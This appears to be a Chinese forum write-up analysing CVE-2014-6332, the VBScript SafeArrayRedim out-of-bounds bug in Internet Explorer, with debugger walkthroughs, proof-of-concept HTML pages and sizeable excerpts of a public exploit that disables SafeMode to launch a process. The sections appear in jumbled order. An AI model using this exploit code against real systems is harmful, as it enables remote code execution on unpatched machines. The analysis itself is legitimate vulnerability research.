
```
function setnotsafemode()
On Error Resume Next
i=mydata()
i=readmemo(i+8)
i=readmemo(i+16)
j=readmemo(i+&h134)
for k=0 to &h60 step 4
j=readmemo(i+&h120+k)
if(j=14) then
j=0
redim Preserve aa(a2)
aa(a1+2)(i+&h11c+k)=ab(4)
redim Preserve aa(a0)
j=0
j=readmemo(i+&h120+k)
Exit for
end if
next
ab(2)=1.69759663316747E-313
runmumaa()
end function
```

第一次读取结果见上文图片，`i=readmemo(i+16)`第二次读取：

![](upload/attach/202103/817966_HNZY9FX3454KJZT.jpg)

该地址为`vbscript!COleScript`对象：

![](upload/attach/202103/817966_4PME29ZVE2KJZGD.jpg)

通过循环于该对象偏移`0x120`之后搜寻`0x0E`，该值用于检查是否处于SafeMode：

![](upload/attach/202103/817966_CHY8B634PDKRWNZ.jpg)

`aa(a1+2)`存储的是之前构造数组对象——`myarray`：

![](upload/attach/202103/817966_RRDJ MWCABYNPWV.jpg)

`myarray`起始地址为0，`rgsabound.cElements`为`0x7fff0000`，故可读写`vbscript!COleScript+0x170`处内容：

![](upload/attach/202103/817966_H6HY2MMJG654GZ5.jpg)

修改完成，进入GodMode，成功弹出notepad.exe。

## 0x03 参阅链接

- <a href="elink@9eeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3q4H3K9g2)9J5c8X3!0S2K9h3c8D9i4K6u0r3L8Y4y4Q4x3X3c8G2j5h3W2V1L8q4)9J5k6s2y4S2k6X3g2S2M7Y4u0S2P5b7`.`.">Microsoft Docs——SAFEARRAY</a>
- [VBScript Scripting Engine初探](https://bbs.pediy.com/thread-266286.htm)

## 0x01 漏洞信息

### 0x01.1 漏洞简述

- 编号：CVE-2014-6332
- 漏洞影响：远程代码执行(RCE)
- CVSS 2.0：9.3

`oleaut32.dll`中`SafeArrayRedim`在进行数组重新定义时未对传入参数`psaboundNew`进行有效校验，以致可以越界读写，进而造成任意代码执行。

### 0x01.2 漏洞影响

Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, Windows RT Gold and 8.1

### 0x01.3 修复方案

[MS14-064](https://bbs.kanxue.com/elink@bfeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0V1N6i4m8V1j5i4c8W2M7#2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6j5Y4g2D9L8r3g2@1K9h3&6K6i4K6u0r3x3U0l9I4y4q4)9J5c8X3#2K6x3e0c8Q4x3X3b7H3y4U0b7`.)

## 0x02 漏洞分析

### 0x02.1 分析环境

- OS版本：Windows 7 Service Pack 1
- Internet Explorer版本：8.0.7601.17514
- `oleaut32.dll`版本：6.1.7601.17514
- `vbscript.dll`版本：5.8.7601.17514

### 0x02.2 前置知识

请移步[VBScript Scripting Engine初探](https://bbs.pediy.com/thread-266286.htm)。

### 0x02.3 详细分析

分析所用POC如下：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20 | `<!doctype html>`  `<html lang="en">`  `<head>`  `<` /` >`    `<body>`  `<script LANGUAGE="VBScript">`  `On Error Resume` `Next`  `Dim arrayA()`  `Dim size`  `Dim over`  `size` `=` `&h5`  `over` `=` `&h8000000` `+` `size`  `Redim Preserve arrayA(size)`    `Redim Preserve arrayA(over)`  `arrayA(size+1)` `=` `"Hello"`  `<` /`script>`  `<` /`body>`  `<` /`html>` |

打开该POC，使用WinDbg附加调试，于`vbscript!RedimPreserveArray`函数处设断，允许阻止的内容：

![](https://bbs.kanxue.com/upload/attach/202103/817966_PV89SQW3GK5S6HJ.jpg)

执行到`call oleaut32.dll!SafeArrayRedim`处，跟进分析：

![](https://bbs.kanxue.com/upload/attach/202103/817966_36SKTTBS63QT2N5.jpg)

首先是判断传入参数`psa`与`psaboundNew`均不为空：

![](https://bbs.kanxue.com/upload/attach/202103/817966_T4SSK9PXEDQ55GW.jpg)

之后对`psa.fFeatures`，`psa.cDims`及`psa.cLocks`进行判断：

![](https://bbs.kanxue.com/upload/attach/202103/817966_FBZNSX2WEPDSN93.jpg)

`call SafeArraySize`计算数组元素占用空间大小：

![](https://bbs.kanxue.com/upload/attach/202103/817966_R2K8M3SGRD859HG.jpg)

将`psaboundNew`写入`psa.rgsabound`中：

![](https://bbs.kanxue.com/upload/attach/202103/817966_DHEXYHUFNAWWPW5.jpg)

调整后数组：

![](https://bbs.kanxue.com/upload/attach/202103/817966_D8WX42J66HWVWWT.jpg)

计算调整后数组元素占用空间大小，减去原来数组元素占用空间大小：

![](https://bbs.kanxue.com/upload/attach/202103/817966_N5A5XN245TB9FJ6.jpg)

由于此时`ebx=80000000`，故执行结果为负数指令分支 ：

![](https://bbs.kanxue.com/upload/attach/202103/817966_9T5Q33Q5FW33U3X.jpg)

`ole32!CRetailMalloc_Alloc`函数用于为`HeapAlloc`传递参数并调用之：

![](https://bbs.kanxue.com/upload/attach/202103/817966_PDMEZRZ55F37NY2.jpg)

由于申请空间远远超过可分配空间大小，故分配失败，直接跳转到函数末返回错误值：

![](https://bbs.kanxue.com/upload/attach/202103/817966_XA2HCM4T3EHQ7UM.jpg)

由此，便可实现任意地址读写。

下面来看看正常执行流程，修改POC如下：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21 | `<!doctype html>`  `<html lang="en">`  `<head>`  `<` /` >`    `<body>`  `<script LANGUAGE="VBScript">`  `On Error Resume` `Next`  `Dim arrayA()`  `Dim size`  `Dim over`  `size` `=` `&h6`  `resize` `=` `&h4`  `Redim Preserve arrayA(size)`  `arrayA(0)`=`"Jane"`  `arrayA(5)`=`"Alan"`  `Redim Preserve arrayA(resize)`  `IsEmpty(arrayA)`  `<` /`script>`  `<` /`body>`  `<` /`html>` |

调整后数组元素占用空间大小-原来数组元素占用空间大小=`0x50`-`0x70`=`ffffffe0`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_ZNMY3KV96QJ54XG.jpg)

对其取相反数后申请如此大小空间：

![](https://bbs.kanxue.com/upload/attach/202103/817966_JPG4M5VRQ39NQXA.jpg)

之后将数组多余元素即`arrayA(5)—arrayA(6)`复制到此空间内：

![](https://bbs.kanxue.com/upload/attach/202103/817966_TXWVZFUXZD57KGN.jpg)

![](https://bbs.kanxue.com/upload/attach/202103/817966_PUSAPA93JXTHEYK.jpg)

`call ole32!CRetailMalloc_Realloc`重新分配堆块：

![](https://bbs.kanxue.com/upload/attach/202103/817966_AWXS4MV97UJV2CG.jpg)

总结：

1. `SafeArrayRedim`函数在未重新分配空间之前便将`psaboundNew`写入`psa.rgsabound`，用以传递给`SafeArraySize`函数计算调整数组元素大小
2. `sub ebx, [ebp+Size]`及`test ebx, ebx`两条指令用于判断调整数组元素大小—原数组元素大小与零的关系，小于零/大于等于零进入不同分支处理
3. `neg [ebp+psaboundNew]`对调整数组元素大小与原数组元素大小差值取相反数，将其传递给`HeapAlloc`函数分配相应大小堆块

POC中`&h8000000`(该值经过`SafeArraySize`函数计算后为0x80000000)正是利用以上三点，实现任意地址读写——`test ebx, ebx`与`jge`组合进行有符号数比较，`neg`对其取反仍为0x80000000。

### 0x02.4 利用分析

Exp来自[yuange](https://bbs.kanxue.com/elink@004K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2W2P5s2m8D9L8$3W2@1i4K6u0V1k6r3u0Q4x3X3g2U0L8$3#2Q4x3V1k6W2P5s2m8D9L8$3W2@1M7#2)9J5c8U0x3#2x3U0t1&6)。

第一部分：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75 | `function BeginInit()`  `Randomize()`  `redim aa(5)`  `redim ab(5)`  `a0`=13+17*rnd(6)`  `a3`=7+3*rnd(5)`  `end function`    `function Create()`  `On Error Resume` `Next`  `dim i`  `Create`=False`  `For i` `=` `0` `To` `400`  `If Over()=True` `Then`  `'   document.write(i)`  `Create`=True`  `Exit For`  `End If`  `Next`  `end function`    `......`    `function Over()`  `On Error Resume` `Next`  `dim type1,type2,type3`  `Over`=False`  `a0`=a0+a3`  `a1`=a0+2`  `a2`=a0+&h8000000`    `redim  Preserve aa(a0)`  `redim   ab(a0)`    `redim  Preserve aa(a2)`    `type1`=1`  `ab(0)`=1.123456789012345678901234567890`  `aa(a0)`=10`    `If(IsObject(aa(a1-1))` `=` `False`) Then`  `if`(intVersion<4) then`  `mem`=cint(a0+1)*16`  `j`=vartype(aa(a1-1))`  `if`((j=mem+4)`or`(j*8=mem+8)) then`  `if`(vartype(aa(a1-1))<>0)  Then`  `If(IsObject(aa(a1))` `=` `False`) Then`  `type1`=VarType(aa(a1))`  `end` `if`  `end` `if`  `else`  `redim  Preserve aa(a0)`  `exit  function`  `end` `if`  `else`  `if`(vartype(aa(a1-1))<>0)  Then`  `If(IsObject(aa(a1))` `=` `False`) Then`  `type1`=VarType(aa(a1))`  `end` `if`  `end` `if`  `end` `if`  `end` `if`    `'0x6f66` `&` `0xFFFFBFFF`=0x2f66`  `If(type1`=&h2f66) then`  `Over`=True`  `End If`  `If(type1`=&hB9AD) Then`  `Over`=True`  `win9x`=1`  `End If`    `redim  Preserve aa(a0)`    `end function` |

通过循环不断重新定义数组，扩大数组规模，直至数组`aa`与`ab`于内存中相邻(准确 来说，二者相差8字节)：

![](https://bbs.kanxue.com/upload/attach/202103/817966_SX47FJK5K69DCSC.jpg)
